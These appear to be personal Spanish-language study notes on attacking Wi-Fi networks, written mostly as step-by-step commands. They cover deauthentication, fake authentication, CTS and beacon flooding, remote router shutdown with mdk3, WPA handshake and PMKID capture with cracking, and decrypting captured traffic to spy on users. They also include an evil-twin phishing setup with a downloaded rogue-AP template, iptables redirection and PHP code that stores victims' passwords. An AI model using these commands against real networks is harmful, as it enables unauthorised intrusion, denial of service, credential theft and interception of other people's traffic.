"""
!INTERFACES DE RED
Una interfaz de red es el software que se comunica con el dispositivo que nos brinda internet y la capa IP
a fin de proporcionar a la capa IP una interfaz coherente con todos los adaptadores de red que puedan estar 
presentes.


?$ ifconfig ---> listar interfaces de red 

?$ iwconfig 
listar más interfaces de red, incluye algunas que no estan activas, dadas de bajas, etc. Estas
se habilitan para con los containers desplegados

!TARJETAS DE RED

Si bien la pc suele traer una, por lo que si estamos en una distribucion de linux con el os de base, y no una 
vm, etc. Podriamos utilizar esta tarjeta de red si es que acepta el modo monitor. Al conectar una tarjeta de 
red se crearia una nueva interfaz, mediante la cual nos podriamos comunicar con la misma.

ES IMPORTANTE QUE TENGAMOS UNA TARJETA DE RED o ADAPTADOR WIFI CON MODO MONITOR PARA PODER ESCANEAR EL MOVIMIENTO
EN LA RED

!DIRECCIONES IP

*PRIVADAS
?$ hotname -I 

La ip privada es la ip que se asigna dentro del entorno de red local, por lo que si alguien por ejemplo nos 
lanzase una traza icmp, nuestra maquina no responderia ya que es la ip que utiliza para el segmento de red priv.

*PUBLICAS
En cambio la ip publica es con la ip que salimos a internet, la cual debemos cuidar para que no sea obtenida por
nadie.

?$ curl https://ipinfo.io

vermiip.es

!DIRECCIONES MAC

Es como el dni de un dispositivo, un celular, una tarjeta de red, el router, etc.

Para ver la direccion mac de un dispositivo 

?$ macchanger --help

?$ macchanger -s {dispositivo}

Los primeros 3 bytes de la mac identifican el fabricante

!VULNERACION

*Redes WPA/WPA2 

Ponernos en modo monitor para poder efectuar estos ataques, nos permite capturar y escuchar paquetes que viajan
en el aire, podriamos identificar distintos puntos de accesos que hay en el entorno, clientes autenticados con
sus direcciones mac, direcciones mac de los distintos AP (access point)
SSID ---> Nombre de la red
BSSID --> Direccion mac del ruter

Si nuestra tarjeta de red admite modo monitor podemos iniciarlo con 

?$ airmon-ng start {interfaz} | airmon-ng stop {interfaz}

?$ ifconfig 
Al hacer esto nuestra tarjeta de red ya no estaria

?$ iwconfig
Pero al hacer esto la veriamos, para levantarla

?$ ifconfig {interfaz} up

Cuando activamos el modo monitor hay que tener en cuenta que ciertos procesos quedan corriendo los cuales 
nos podrian traer ciertos problemas en ataques. Ya que el dhclient nos asigna ip por dhcp y el supplicant 
para que nos mantenga conectados a la red. Y practicamento todos los ataques se pueden hacer de manera offline.
Para matar estos procesos conflictivos se pueden matar de 3 formas distintas

?$ pkill dhclient && pkill wpa_supplicant
?$ killall dhclient wpa_supplicant
------
?$ airmon-ng check kill

Cuando paramos el modo monitor se recomienda es reinicar el servicio networking 

?$ /etc/init.d/networking restart

Falsificar la direccion mac 

MAc -----> Direccion unica de un dispositivo, como el dni

Se conforma de 3 pares, siendo los 3 primeros el famoso OUI (Organization Unique Identifier) y los ultimos 3 el Network Controller
Specific

?$ macchanger -l 

Listar lista de los OUI conocidos

Por lo que podriamos usar los OUI para falsificar la mac de nuestro dispositivo

?$ macchanger -l | grep -i "national security agency"
8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY

?$ macchanger --mac=00:20:91:da:af:91 {interfaz}

(hexadecimal --> n (1 - 9) l (a - f))

--> [ERROR] Could not change MAC: interface up or insufficient permissions: Device or resource busy

Esto pasa porque la red wlan0mon esta dada de alta

?$ ifconfig wlan0mon down

?$ ifconfig wlan0mon up


! AIRCRACK-NG 

Es una suite (paquete de programas) de seguridad inalambrica. Es un analizador de paquetes de redes, recupera contraseñas WEB y 
WPA/WPA2 asi como otro conjunto de  herramientas de auditorias inalambricas

Las herramientas más utilizadas para la auditoría inalámbrica son:

Aircrack-ng (descifra la clave de los vectores de inicio)
Airodump-ng (escanea las redes y captura vectores de inicio)
Aireplay-ng (inyecta tráfico para elevar la captura de vectores de inicio)
Airmon-ng (establece la tarjeta inalámbrica en modo monitor, para poder capturar e inyectar vectores)

?$ airodump-ng {interfaz}


 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 E4:AB:89:3C:7F:C7  -29       31        1    0  11  130   WPA2 CCMP   PSK  colgatedeesta   

Donde BSSID ----> MAC del router
PWR ----> Power 
#Data ---> Data
#/s ----> por segundo
CH -----> chanel
MB ----> MegaBytes
ENC ---> Encriptado
CIPHER -----> parte del cifrado
AUTH ----> Clave de autorizacion
ESSID ----> Nombre de la red

Channel hoppin es lo que hace la tarjeta de red para ir cambiando entre canales para asi encontrar redes

CLIENTES 

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 CC:ED:DC:1F:22:61  74:EB:80:4D:64:64  -70    0 - 1e     0        1       

BSSID ---> MAC del router al que se esta conectado
STATION ---> MAC del dispositivo (celular, pc, tele, etc)
PWR ---> Power
RATE ---> Tasa de recepcion - Tase de retransmicion (se muestra la e si la red se encuentra con el QOS habilitado) 
LOST ---> paquetes perdidos en los ultimos 10s
FRAMES ---> numero de paquetes enviados por el cliente
NOTES ---> Info adicional
PROBES ---> Probe request, buscando un probe response de redes previas a las que se haya conectado en el pasado el dispositivo

! Filtros con airodump-ng

Filtrar por canales

?$ airodump-ng -c {n°_channel} {interfaz}

?$ airodump-ng --essid {name_essid} {interfaz}

?$ airodump-ng --bssid {bssid} {interfaz}

?$ airodump-ng --bssid {bssid} -w {file_name} {interfaz}

Para hackear una red inalambrica, necesitamos ir guardando todo el trafico en un file para poder capturar la contraseña ya que 
esta no va a estar en texto claro, si no cifrada con el CIPHER que tenga, posteriormente necesitariamos extraer el hash de la 
clave cifrada para aplicar fuerza bruta, este es el porque se necesita la captura 

El archivo que nos interesa de los que crea es el .cap, el que va a alojar el hash de la contraseña

!HANDSHAKE

Se genera en el momento en el que el usuario se reconecta a la red, ya que el usuario esta volviendo a proporcionar las credenciales
de la conexion (claramente en texto no claro).

De esta manera se pueden enviar paquetes al marco de deautenticacion del router para expulsar a los clientes de la red inalambrica
Para hacerlo nos tenemos que enfocar en los clientes, si este es uno o son pocos lo que podemos hfalsaacer es un ataque de 
deauthenticacion por mac

!ATAQUE DE DEAUTHENTICATION

?$ aireplay-ng -0 {n_paquetes} -e {name_essid} -c {mac_cliente} {interfaz}

En caso contrario, si tuviesemos muchos usuarios podriamos hacer un ataque de deauthenticacion global

?$ aireplay-ng -0 {n_paquetes} -e {name_essid} -c FF:FF:FF:FF:FF:FF {interfaz}
o
?$ aireplay-ng -0 {n_paquetes} -e {name_essid} {interfaz}
0 paquetes para que sea infinito

Tambien puede --deauth

Esto de FF:FF:FF:FF:FF:FF es la broadcast mac addres, de esta manera desconectariamos a todos los usuarios y con que uno se 
reconecte, capturariamos el handshake.

!ATAQUE DE FALSA AUTENTICATION

Si la red no tuviese clientes, podriamos hacer un ataque de fakeauth. 

?$ aireplay-ng -1 0 -e {name_essid} -a {bssid} -h {direccion_mac_falsa} {interfaz}

Al ingresar y lograr ver en el escaneo de trafico la mac ingresada como cliente, no quiere decir que la misma
este conectada, ni que tenga una direccion ip asignada. Engañamos al ruter para hacerle creer que tiene un nuevo cliente.

!ATAQUE DE SECUESTRO DE ANCHO DE BANDA (CTS Frame Attack)

Fundamentos de CTS y RTS. RTS (Requests to send) Pedido de reserva del canal para un periodo de timepo determinado.
CTS (Clear to send) reserva el canal para que se envie 

CTS:

   Frame
  Control  Duration   Receiver Address
 _______________________________________
[_C4_|_00_|_00___7D_|_XX:XX:XX:XX:XX:XX_]   FCS
  |    |
  |    V
  |   Flags
  V   
Type/SubType

Por ejemplo, podemos ponernos en escucha de una red determinada

?$ airodump-ng --essid {name_essid} -c {channel} -w {file_name} wlan0mon

De esta maner estamos capturando el trafico de la red ingresada y guardando el mismo en un archivo.
Particularmente nos intersa el que se encuentra con la terminacion .cap

Podemos ver la captura con tshark y filtrar por las CTS.

?$ tshark -r {file.cap} -Y "wlan.fc.type_subtype" 2>/dev/null

Tmb podriamos ver la informacion en json agregando el parametro -Tjson, filtrar por campos con -Tfields -e wlan.duration

Tambien se podria usar whireshark

?$ whireshark {file.cap} > /dev/null 2>&1 & 
?$ disown

De esta manera lo independisamos en segundo plano y con el disown para independisar el proceso hijo del padre y que el mismo
se convierta en padre

Una vez en la herramienta buscamos el filtro en el buscador de wlan.fc.type_subtype, seleccionamos un paquete, vamos a archivo,
posteriormente a esportar paquetes seleccionados, exportamos solo el seleccionado con un nombre y ya tenemos el ctsframe.

Con la herramienta ghex podemos abrir la captura para poder modificar la misma

?$ ghex {file_cap_downloaded} > /dev/null 2<&1 & disown

(Lo que debemos modificar es el apartado del tiempo asi como si quisiesemos de la mac, por lo que desde el propio wireshark
podemos ver de manera previa, clickeando en el apartado de IFE y en el tiempo o la mac, que valores hexadecimales pertenecen
en la CPS cap, para asi posteriormente con python poder configurar los valores que querramos "hex(30000)" --> 0x7530 y oponer 30 75 )

De esta manera una vez terminada el CTS, podemos empezar a hacer el ataque para saturar la red.
Haremos uso de la herramienta tcpreplay para replicar trafico de red pre capturado como archivos pcap.

Una vez tengamos la data CPS en un archivo PCAP editado a nuestro gusto, toca replicarlo con la herramienta mencionada

?$ tcpreplay --intf1={interface} --topspeed --loop=2000 {file.pcap} 2>/dev/null

Para utilixar nuestra interfaz de red (tarjeta modo monitor) indicarle que queremos la maxima velocidad y replicar esto un total
de 2000 veces

De manera adicional con wireshark filtrando por la señal CTS (wlan.fc.type_subtype==28) y corroborar que estos 2000 paquetes de
30000 s se transmitieron de manera exitosa


!Ataque Becaon Flood

Este ataque consiste en "invadir" el "espacio aereo" con paquetes becaon que son emitidos por los puntos de acceso para verificar
dispositivos. Estos paquetes contienen info, tipo de cifrado, ssid, canal (punto de acceso), etc.
La idea es emitir muchos paquetes beacon con info falsa referente. De esta manera saturamos el espectro de onda de la red.

?$ mdk3 wlan0mon b -f {file_name} -a -s 2000 -c {channel}

Al ejecutar este ataque veriamos muchas redes con el nombre de cada uno de las lineas del file_name se crearian saturando asi
la red  

Por ejemplo 

?$ for n in $(seq 1, 10); do echo 'Network$n' >> {file_name}; done

?$ mdk3 wlan0mon b -f {file_name} -a -s 2000 -c {channel}

De esta manera veriamos en la red 10 redes del 1 al 10 con el nombre Netwok1, Netwok2, Netwok3, Netwok4...etc

!Disassociation Amok Mode Attak

Este ataque es un ataque de deauthentication dirigido.
Atravez de este ataque podemos trabajar con un archivo de withelist y backlist donde incluir clientes

En este caso vamos a usar una blaklist, por lo que podriamos crear un archivo con le nombre blacklist, con el contenido de 

"{mac:addres1}"
"{mac:addres2}"

?$ mdk3 wlan0mon d -w blacklist -c {channel}

De esta manera estaria deauthenticando a los clientes ingresados, y al parar el ataque, HANDSHAKE

!Michael Shutdown Exploitation

Apagar router de manera remoto

?$ mdk3 m -t "mac:target" 

!PROBE REQUEST/RESPONSE, BEACON y ASSOCIATION REQUEST/RESPONSE

cts(clear to send) -->  wlan.fc.type_subtype==28

Cuando se deauthentica un dispositivo, al intentar volverse a conectar a la red que fue desconectado, emite un probe request
para ver si el router le contesta y envia un probe response

?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==4" 2>/dev/null

Para capturar el probe response ---> 
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==5" 2>/dev/null

Para capturar el ASSOCIATION REQUEST ---> 
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==0" 2>/dev/null

Para capturar el ASSOCIATION RESPONSE ---> (cuando el ap response a la asociacion del cliente el punto de acceso)
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==1" 2>/dev/null

Para capturar los paquetes beacon que son los que indican el canal y la informacion del ap
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==8" 2>/dev/null

Si la asosiacion es exitosa, posteriormente debe de autenticarse, por lo que vienen los paquetes de autenticacion
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==11" 2>/dev/null

Paquetes de deautenticacion
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==12" 2>/dev/null

Si el paquete de deautenticacion es exitoso esta el paquete de desasociacion
?$ tshark -r {cap.pcap} -Y "wlan.fc.type_subtype==10" 2>/dev/null

!Extraccion de handshake hash con aircrack

Para extraer le hash del handshake capturado podemos usar aircrack-ng, el cual tiene un parametro el cual es -J el cual crea
un archivo a hccap, y esto lo podemos hacer ya que existe una herramienta llamada hccap2john, esto lo podemos ver con

?$ locate 2john 

De esta manera veriamos todas las herramientas que permiten pasar un hash para tratarlo con fuerza bruta con la herramienta john.

?$ arirack-ng -J {newfiletohccap} {file.cap/pcap}

Una vez que tengamos el archivo hccap, usariamos la herramienta para obtener el apartado del hash de la contraseña

?$ hccap2john file.hccap > hash

Y dentro de hash tendriamos un contenido de la sig forma 

RED:$WPAPSK$RED#m9EWJlxTA16pf2li.M6GcfvLU851XqPzBnET9XGBFjsKk8cd4Yv7wOKIuGoFXCpGwK6BaBpYFljxK7pjJV.cM8NQ4ebzjV2Lk5LCFE21.5I0.Ec............/.M6GcfvLU851XqPzBnET9XGBFjsKk
8cd4Yv7wOKIuGo.................................................................3X.I.E..1uk2.E..1uk2.E..1uk0..0ZfeUJSR2vwPOBmX91lNnIfELNmh6TAFDPxwfHVtuNZwAr....................
................................................................................................................../t.....U.../G5ujo8KdvlpVN32NxZTtg:303235ac4c6e:c8b422571f5f:c
8b422571f5f::WPA2:file.hccap

Siendo la contraseña desde el # luego del nombre de la red, hasta los :: que a continuacion indican el protocol (WEB,WPA,WPA)

Ejemplo:

#m9EWJlxTA16pf2li.M6GcfvLU851XqPzBnET9XGBFjsKk8cd4Yv7wOKIuGoFXCpGwK6BaBpYFljxK7pjJV.cM8NQ4ebzjV2Lk5LCFE21.5I0.Ec............/.M6GcfvLU851XqPzBnET9XGBFjsKk
8cd4Yv7wOKIuGo.................................................................3X.I.E..1uk2.E..1uk2.E..1uk0..0ZfeUJSR2vwPOBmX91lNnIfELNmh6TAFDPxwfHVtuNZwAr....................
................................................................................................................../t.....U.../G5ujo8KdvlpVN32NxZTtg:303235ac4c6e:c8b422571f5f:c
8b422571f5f

Ahora bien, para crackear el hash, una vez que lo tengamos en un formato .hccap par poder pasarlo posteriormente, gracias a 
ghccap2john a la herramienta john, simplemente ejecutamos un ataque de fuerza bruta

?$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 

Esto en caso de que alguna de las palabras dentro de la lista rockyou.txt coincidan con el hash arrojaria la contraseña de la ap
(acces point)

En caso de que ninguna contraseña coincida con el ap no arrojara resultados, ahora bien, esto tmb se puede hacer de manera manual 
sin tener que con aircrack ejecutar ' aricrak-ng -J {file.pcap/cap} hash ' para asi capturar 

!Extraer el hash del handshake con aircrack

?$ aricrack-ng -w /usr/share/wordlists/rockyou.txt {initial_file.cap/pcap}

De esta manera podriamos ejecutar el mismo ataque, de una manera mas facil y sencilla. Ya que aircrack tiene contemplado todo
y con el archivo inicial de captura de trafico con "airdump-ng -w {file_cap/pcap} {interfaz}" 

!Proceso de ataque con Bettercap

con la herramienta bettercap se puede capturar y ver una ""gui"" del manejo de la tarjeta red

!Aumento de la velocidad de computos (Rainbow Table)

El proceso de un ataque de fuerza bruta, sea con john, aircrack, pyrit, cowpatty o airolib es  la misma, cada una de las passwords
del diccionario pasado como wordlist, se necesita hashear para posteriormente comparar, lo que retrasa de una manera sinficante
el ataque, el aumento de la velocidad de computos con Rainbow Table consiste en crear un diccionario de claves precomputadas para
que el proceso de fuerza bruta se reduja a comparar hashes.

?$ cowpatty -r {file.cap} -f /usr/share/wordlists/rockyou.txt -s {ap_name(essid)}

Para crear una lista de hashes (base de datos), podemos usar (exclusivo para aircrack) la herramineta airolib-ng,

?$ airolib-ng {passwords-airolib} --import passwd /usr/share/wordlists/rockyou.txt

Le indicamos un archivo de exportacion (passwords-airolib), le indicamos el archivo de contraseña que queremos usar

?$ echo "{eessid}" > {essid.lst}

Creamos un archivo con el o los essids que queramos.

?$ airolib-ng {passwords-airolib} --import essid {essid.lst}

Le pasamos el essid

?$ airolib-ng {passwords-ariolib} --stats

Con stats podemos ver si esto funciono, las passwords cargadas, etc

?$ airolib-ng {passwords-airolib} --clean all 

La idea seria limpiar el archivo ya que puede haber saltos de líneas, lineas no legibles, etc.

?$ airolib-ng {passwords-airolib} --batch 

Proceso final para crear la lista final de passwords hasheadas.

Recordar que este proceso y archivo creado solo funciona para aricrack, este tiene un argumento el cual es -r que admite una 
base de datos de airolib. 

?$ aircrack-ng -r {passwords-airolib} {file.cap}

Tambien tenemos herramientas como GenPMK para crear las rainbow tables 

?$ genpmk -f /usr/share/wordlists/rockyou.txt -s {essid target} -d {dic.genpmk}

Teniendo el diccionario de hashes, en dic.genpmk, podemos fucionarlo con herramientas como cowpatty

?$ cowpatty -d dic.genpmk -r {file.cap} -s {essid_target}

!ESPIONAJE 

Una vez conseguida la contraseña de la red, podriamos capturar todo el trafico de la red, desencriptarlo para asi poder ver todo
el trafico entero, es decir, que paginas visita, metodos http, direcciones ip, etc.
Para hacer esto lo primero que tenemos que hacer es desencriptar todo el trafico

?$ airdecap-ng -p {password} -e {essid_target} {file.cap}

Una vez hecho esto, si la contraseña es incorrecta, no se lograran desencriptar paquetes, pero de serlo se lograran 
desencriptar todos los paquetes wpa o que correspondan, que se hayan capturado, pudiendo ahora asi, con herramientas como tshark o
wireshark, filtrar por metodos post, ver peticiones http, etc.

?$ tshark -r {file-dec.cap} -Y "dns" 2>/dev/null
?$ tshark -r {file-dec.cap} -Y "http" 2>/dev/null
?$ tshark -r {file-dec.cap} -Y "http.request.method==POST" -Tjson 2>/dev/null
?$ tshark -r {file-dec.cap} -Y "http.request.method==POST" -Tfields -e http.file_data 2>/dev/null

!Funny attacks

Con la herramienta xeroxsploit podemos ejecutar una consola interactiva la cual continene una serie de ataques escribiendo el 
comando help, en donde, una vez tengamos la ip del dispositivo victima, podemos efectuar con el comando replace e indicando una 
imagen, el ataque de replace, el cual consiste en remplazar todas las imagenes que el usuario victima vaya ver con la que nostros
hayamos especificado. 

!Evil twin

La idea de este ataque, es que en los casos en que la contraseña no se aloje en un diccionario, y no sea posible crackear la pass,
crear un evil twin, consiste en deautenticar a los clientes de una red, para crear un ap con el mismo essid para que el usuario se
conecte y una vez lo haga dirigirlo a una plantilla de su portal de internet el cual le pida la password y hasta  que esta no sea 
ingresada no dejarlo navegar, obviamente cuando la misma sea ingresada lo desconectaremos y daremos de baja el falso ap y lo
dejaremos ingresar al verdadero ap.

En el dir /etc crearemos un archivo de configuracion para un herramienta, puede tener de nombre "dhcd.conf" con el sig contenido:

 authoritative;
 default-lease-time 600;
 max-lease-time 7200;
 subnet 192.168.1.128 netmask 255.255.255.128 {
     option subnet-mask 255.255.255.128;
     option broadcast-address 192.168.1.255;
     option routers 192.168.1.129;
     option domain-name-servers 8.8.8.8;
     range 192.168.1.130 192.168.1.140;
 }

Esto ya que la idea es que mediante dhcp se le asigne una ip a nuestro target cuando se conecte a nuestro ap.
Asignamos el timpo minimo (default-lease-time) y maximo (max-lease-time) que queremos que pase antes de que se le asigne una nueva
ip. Posteriormente le asignaremos un segmento aislado al nuestro (ip) asi como la net-mask. Y varias opciones de configuracion.
Por ultimo el rango de ips disponible

Una vez configurado el archivo de configuracion de dhcpd en la ruta /etc procederiamos a descargarnos la plantilla que vamos a usar
en este caso ejecutariamos en /var/www/html el comando 

?$ wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip

Esto para descargarnos la plantilla junto al funcionamiento, ahora solo faltaria configurar las db, y levantar los servicios de 
apache2 y mysql

?$ service start apache2 && service start mysql

Una vez hecho esto, si probaramos la plantilla veriamos que la misma al ingresar contraseñas indica que "fakeap" no existe, esto
es debido a que en el archivo dbconnect.php se busca al usuario "fakeap", la db "rogue_AP", la tabla "wpa_keys" y las columnas
"password1" y "password2". Asi que solo quedaria hacer esto.

?$ mysql -u root 

?$ create database rogue_AP;

?$ use rogue_AP;

?$ create table wpa_keys(password1 varchar(32), password2 varchar(32));

?$ insert into wpa_keys (password1, password2) values ('dobliuw', 'dobliuw');

?$ create user fakeap@localhost identified by 'fakeap';

?$ grant all privileges on rogue_AP.* to 'fakeap'@'localhost'

!Importante! El archivo de php esta deprecado, por lo que la configuracion con mysql dara error, a continuacion la solucion del
! php:

Eliminar el archivo anterior de nombre dbconnect.php, y crear el sig archivo con el mismo nombre:

------------------- dbconnect.php ---------------------

 <?php
 try {
     $host="localhost";
     $username="fakeap";
     $pass="fakeap";
     $dbname="rogue_AP";
     $tbl_name="wpa_keys";
     $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $pass);
     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     if(!$conn){
         $error = $conn->errorInfo();
         echo "Error: " . $error[2];
     }
     $password1=$_POST['password1'];
     $password2=$_POST['password2'];
     $stmt = $conn->prepare("INSERT INTO wpa_keys (password1, password2) VALUES 
 (:password1, :password2)");
     $stmt->bindParam(':password1', $password1);
     $stmt->bindParam(':password2', $password2);
     $stmt->execute();
     echo "New record created successfully";
     $conn = null;
     sleep(2);
     header("location:upgrading.html");
     ob_end_flush();
 }
 catch(PDOException $e) {
     echo "Error: " . $e->getMessage();
 }
 ?>

-------------------------------------------------

!Creación del punto de acceso falso con AIRBASE

Con la herramienta airbase-ng podemos crear este punto de acceso falto, aunque necesitara que se le haga de puente una nueva
interfaz de red "at0"

?$ airbase-ng -e {target_essid} -c {target_channel} -P {interfaz_monitor_mode}
-P ----> Respond to all probes, even when specifying ESSIDs

!Definicion de reglas con iptables y creacion de interfaces de red

Una vez que estemos ejecutando el script previamente explicado de airbase, la idea es crear el bridge, es decir la interfaz at0, por
la cual el usuario se va a redirigir y nosotros vamos a redirigir a nuestro terreno.

Teniendo en vista el archivo configurado en /etc/dhcpd.conf 

 authoritative;
 default-lease-time 600;
 max-lease-time 7200;
 subnet 192.168.1.128 netmask 255.255.255.128 {
     option subnet-mask 255.255.255.128;
     option broadcast-address 192.168.1.255;
     option routers 192.168.1.129;
     option domain-name-servers 8.8.8.8;
     range 192.168.1.130 192.168.1.140;
 }

Creamos la interfaz de red
?$ ifconfig at0 192.168.1.129 netmask 255.255.255.128
En primer lugar el option routers y en segundo lugar la mascara de red

?$ route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
En primer lugar la subnet, posteriormente la netmasak y por ultimo el gateway (pasarela | options routers) 

Ahora abria que habilitar el enrutamiento en el sistema

?$ echo 1 > /proc/sys/net/ipv4/ip_fordward
Esto para habilitar el enrutamiento
!IMPORTANTE al terminar deberiamos volver como mayormente se encuentra el archivo, q es emitiendo un 0

Ahora hay que definir que queremos que pase cuando el usuario de conecte a nuestro ap, de esta manera vamos a tirar de iptables 
por lo que primero es recomendable limpiar las iptables por si existen configuraciones previas.

Limpieza iptables

?$ iptables --flush

?$ iptables --table nat --flush

?$ iptables --delete-chain

?$ iptables --table nat --delete-chain

Y ahora con -S o -L podemos ver las reglas

?$ iptables -L

------

De esta manera ahora deberiamos definir las reglas para que el usuario se conecte a nuestro ap, sea redirigido al servidor en 
apache.

?$ iptables --table nat --append POSTROUTING --out-interface enp0s3/eth0 (interfaz ethernet) -j MASQUERADE
De esta manera le indicamos que queremos agreagar una regla que la interfaz que nutre de conectividad a la at0

?$ iptables --append FORWARD --in-interface at0 -j ACCEPT
Le indicamos cual es el camino a seguir. queremos agregar el FORDWARD con una interfaz interna que es la at0 y queremos aceptar
la conexion, es decir para que el flujo de paquetes continue si problemas

?$ iptables -t(--table) nat -A(--append) PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
Cuando se detecte trafico por el puerto 80 del usuario por el protocolo tcp, queremos aplicar una redireccion a nuestra direccion
ip por el puerto 80, en donde esta el servidor apache.

?$ iptables -t nat -A POSTROUTING -j MASQUERADE

Ahora solo tendriamos que activar el demonio de dhcp que creamos 

?$ cd /etc

?$ dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
-cf --> indicar fichero de configuracion
-pf --> ruta en la que almacenar el pid
at0 --> interfaz creada

Si tira error que no resuelve a /var/lib/dhcp/dhcpd.leases:
?$ touch /var/lib/dhcp/dhcpd.leases      

git clone https://github.com/s4vitar/evilTrust <---- man

!ATAQUE A REDES SIN CLIENTES

clientless PMKID association attack  (Pairwise Master Key Identifier) para atacar redes inalambricas que cuentan sin clientes 

?$ hcxdumptool -i {interfaz} -o {file_to_Export} --enable_status=1
Esto lo que hace es capturar de las redes los hashes de PMKID y exportarlo a un dir.

?$ hcxpcaptool -z {file_to_export} {prev_file_hcxdumptool}
Esto se encarga de pasar a un archivo solo los hashes capturados en la captura anterior.

!WEB

https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb






"""